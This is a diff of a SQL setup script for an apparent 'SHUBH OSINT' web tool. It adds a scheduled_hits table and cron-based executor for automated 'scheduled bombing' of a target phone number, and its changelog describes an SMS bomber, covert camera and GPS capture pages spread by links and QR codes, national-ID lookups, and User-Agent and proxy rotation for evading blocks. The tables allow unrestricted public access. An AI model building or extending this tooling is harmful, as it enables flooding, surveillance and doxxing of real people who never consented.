@@ -2,8 +2,8 @@
 -- SHUBH OSINT - Complete Supabase Database Setup
 -- =====================================================
 -- Run this SQL in your new Supabase project's SQL Editor
--- Last Updated: 2026-02-13
--- Version: 4.0 (SMS Bomber: Phone-number-only logging)
+-- Last Updated: 2026-02-16
+-- Version: 4.1 (Scheduled Hits + Neon Theme)
 -- =====================================================
 
 -- =====================================================
@@ -105,6 +105,21 @@ CREATE TABLE IF NOT EXISTS public.hit_apis (
   updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
 );
 
+-- Scheduled Hits Table (v4.0 - cron-based automated API hitting)
+CREATE TABLE IF NOT EXISTS public.scheduled_hits (
+  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
+  phone_number TEXT NOT NULL,
+  start_time TIMESTAMP WITH TIME ZONE NOT NULL,
+  interval_seconds INTEGER NOT NULL DEFAULT 60,
+  max_rounds INTEGER DEFAULT 0,
+  is_active BOOLEAN NOT NULL DEFAULT true,
+  last_executed_at TIMESTAMP WITH TIME ZONE,
+  next_execution_at TIMESTAMP WITH TIME ZONE,
+  total_hits INTEGER NOT NULL DEFAULT 0,
+  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
+  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
+);
+
 -- =====================================================
 -- 2. ENABLE ROW LEVEL SECURITY
 -- =====================================================
@@ -117,6 +132,7 @@ ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.hit_apis ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.scheduled_hits ENABLE ROW LEVEL SECURITY;
 
 -- =====================================================
 -- 3. RLS POLICIES
@@ -204,6 +220,23 @@ CREATE POLICY "Anyone can update hit apis" ON public.hit_apis
 
 DROP POLICY IF EXISTS "Anyone can delete hit apis" ON public.hit_apis;
 CREATE POLICY "Anyone can delete hit apis" ON public.hit_apis
+  FOR DELETE TO public USING (true);
+
+-- Scheduled Hits - Public CRUD (for scheduled bombing feature)
+DROP POLICY IF EXISTS "Anyone can read scheduled hits" ON public.scheduled_hits;
+CREATE POLICY "Anyone can read scheduled hits" ON public.scheduled_hits
+  FOR SELECT TO public USING (true);
+
+DROP POLICY IF EXISTS "Anyone can insert scheduled hits" ON public.scheduled_hits;
+CREATE POLICY "Anyone can insert scheduled hits" ON public.scheduled_hits
+  FOR INSERT TO public WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Anyone can update scheduled hits" ON public.scheduled_hits;
+CREATE POLICY "Anyone can update scheduled hits" ON public.scheduled_hits
+  FOR UPDATE TO public USING (true);
+
+DROP POLICY IF EXISTS "Anyone can delete scheduled hits" ON public.scheduled_hits;
+CREATE POLICY "Anyone can delete scheduled hits" ON public.scheduled_hits
   FOR DELETE TO public USING (true);
 
 -- =====================================================
@@ -306,6 +339,13 @@ CREATE TRIGGER update_hit_apis_updated_at
   FOR EACH ROW
   EXECUTE FUNCTION public.update_updated_at_column();
 
+-- Trigger for scheduled_hits
+DROP TRIGGER IF EXISTS update_scheduled_hits_updated_at ON public.scheduled_hits;
+CREATE TRIGGER update_scheduled_hits_updated_at
+  BEFORE UPDATE ON public.scheduled_hits
+  FOR EACH ROW
+  EXECUTE FUNCTION public.update_updated_at_column();
+
 -- =====================================================
 -- 7. INDEXES (for better query performance)
 -- =====================================================
@@ -324,6 +364,9 @@ CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(pass
 CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);
 CREATE INDEX IF NOT EXISTS idx_hit_apis_enabled ON public.hit_apis(enabled);
 CREATE INDEX IF NOT EXISTS idx_hit_apis_name ON public.hit_apis(name);
+CREATE INDEX IF NOT EXISTS idx_scheduled_hits_active ON public.scheduled_hits(is_active);
+CREATE INDEX IF NOT EXISTS idx_scheduled_hits_next ON public.scheduled_hits(next_execution_at);
+CREATE INDEX IF NOT EXISTS idx_scheduled_hits_phone ON public.scheduled_hits(phone_number);
 
 -- =====================================================
 -- 8. REALTIME
@@ -337,8 +380,6 @@ ALTER PUBLICATION supabase_realtime ADD TABLE public.hit_apis;
 -- =====================================================
 
 -- Main Settings (includes admin password, session ID, search tabs, CALL DARK, etc.)
--- NOTE: camSessionId is ONLY changeable via Admin Panel now (v3.2)
--- NOTE: CALL DARK feature added in v3.3 with Omnidim API integration
 INSERT INTO public.app_settings (setting_key, setting_value)
 VALUES ('main_settings', '{
   "sitePassword": "dark",
@@ -431,19 +472,31 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- =====================================================
 -- EDGE FUNCTIONS LIST (deploy from supabase/functions/)
 -- =====================================================
--- Version 4.0 Edge Functions:
--- 1. auth-login        - User login with credit password
--- 2. auth-verify       - Verify session token & get credits
--- 3. credits-deduct    - Deduct credits for search operations
--- 4. admin-passwords   - Admin CRUD for password management
--- 5. aadhar-search     - Aadhar lookup API
--- 6. numinfo-v2        - Phone number info API
--- 7. telegram-osint    - Telegram OSINT API integration
--- 8. call-dark         - Omnidim AI call dispatch API
--- 9. hit-api           - API Hit Engine with pass-through headers
--- 10. image-to-info    - Image analysis API
+-- Version 4.1 Edge Functions:
+-- 1.  auth-login              - User login with credit password
+-- 2.  auth-verify             - Verify session token & get credits
+-- 3.  credits-deduct          - Deduct credits for search operations
+-- 4.  admin-passwords         - Admin CRUD for password management
+-- 5.  aadhar-search           - Aadhar lookup API
+-- 6.  numinfo-v2              - Phone number info API
+-- 7.  telegram-osint          - Telegram OSINT API integration
+-- 8.  call-dark               - Omnidim AI call dispatch API
+-- 9.  hit-api                 - API Hit Engine with UA rotation
+-- 10. image-to-info           - Image analysis API
+-- 11. execute-scheduled-hits  - Cron-based scheduled bombing executor
+--
+-- IMPORTANT CHANGES in v4.1:
+-- - Full Neon Theme: pure black background, neon glow effects
+-- - Header: rainbow running border + color-cycling logo text
+-- - Tab grid: color-changing running border animation
+-- - Feature cards: neon color-specific glow variants
+-- - Logs panel: terminal-style neon green/red logs
+-- - All components: neon text-shadow, backdrop-blur effects
 --
 -- IMPORTANT CHANGES in v4.0:
+-- - scheduled_hits table for cron-based automated API hitting
+-- - execute-scheduled-hits edge function for background execution
+-- - pg_cron + pg_net integration for server-side scheduling
 -- - SMS Bomber: Only phone numbers are logged to search_history
 --   (no more per-hit status/success/fail logs)
 -- - Disabled tabs remain visible but show "contact admin" on use
@@ -454,40 +507,19 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- - APIs persist across sessions and devices (no more localStorage)
 -- - Realtime sync enabled for hit_apis table
 -- - Delete API feature added to API cards
--- - hit-api Edge Function: 10 browser User-Agent rotation
+-- - hit-api Edge Function: 35+ browser User-Agent rotation
 --
 -- IMPORTANT CHANGES in v3.7:
 -- - Tab Container rainbow border now uses 12 UNIQUE colors
 -- - tabContainerBorderColors setting (different from header)
--- - New neon colors: lime, magenta, teal, coral, gold, violet
--- - Additional: aqua, rose, emerald, sunset, electric, mint
--- - Header keeps original rainbow, tabs get 12-color palette
 --
 -- IMPORTANT CHANGES in v3.6:
 -- - QR Code Generator added to CAM CAPTURE section
--- - New QR tab with link type selector (photo/video/custom/chrome/iframe)
--- - QR customization: size, colors, presets
--- - Download QR as PNG with session ID
 -- - qrSize, qrFgColor, qrBgColor, qrIncludeLogo settings
 --
 -- IMPORTANT CHANGES in v3.5:
 -- - Border Effects toggle added in Admin Panel
--- - headerBorderEnabled setting for header rainbow border
--- - tabContainerBorderEnabled setting for tab container border
--- - Header text auto color cycling animation (10 colors)
---
--- IMPORTANT CHANGES in v3.4:
--- - Iframe Capture page added for embedding any URL
--- - camIframeUrl setting added for iframe URL storage
--- - Session change removed from ShubhCam Config tab
--- - Device info + GPS location captured on all capture pages
---
--- IMPORTANT CHANGES in v3.3:
--- - CALL DARK feature added for automated AI calls
--- - Omnidim API integration with secure key storage
--- - Admin panel settings for API Key, Agent ID, toggle
--- - Header gradient animation restored with dynamic colors
--- - Header style functionality fixed (uppercase, glow, etc.)
+-- - headerBorderEnabled, tabContainerBorderEnabled settings
 -- =====================================================
 
 -- =====================================================
@@ -497,15 +529,10 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- user_sessions     : Active login sessions tracking
 -- credit_usage      : Logs all credit deductions
 -- app_settings      : Global app configuration (JSON)
---                     - Includes CALL DARK settings (v3.3):
---                       callDarkEnabled, callDarkApiKey, 
---                       callDarkAgentId, callDarkMaxDuration
---                     - Includes Iframe Capture (v3.4):
---                       camIframeUrl for embedding external URLs
---                     - Includes Border Effects (v3.5):
---                       headerBorderEnabled, tabContainerBorderEnabled
---                     - Includes QR Code Generator (v3.6):
---                       qrSize, qrFgColor, qrBgColor, qrIncludeLogo
+--                     - Includes CALL DARK settings (v3.3)
+--                     - Includes Iframe Capture (v3.4)
+--                     - Includes Border Effects (v3.5)
+--                     - Includes QR Code Generator (v3.6)
 -- captured_photos   : Camera capture photo metadata + device info
 -- captured_videos   : Video capture metadata & URLs
 -- search_history    : All search queries log
@@ -515,4 +542,9 @@ ON CONFLICT (setting_key) DO NOTHING;
 --                     - force_proxy, rotation_enabled
 --                     - residential_proxy_enabled
 --                     - Realtime sync enabled for live updates
+-- scheduled_hits    : Scheduled bombing configurations (v4.0)
+--                     - phone_number, start_time, interval_seconds
+--                     - max_rounds, is_active, total_hits
+--                     - last_executed_at, next_execution_at
+--                     - Executed by pg_cron + execute-scheduled-hits
 -- =====================================================
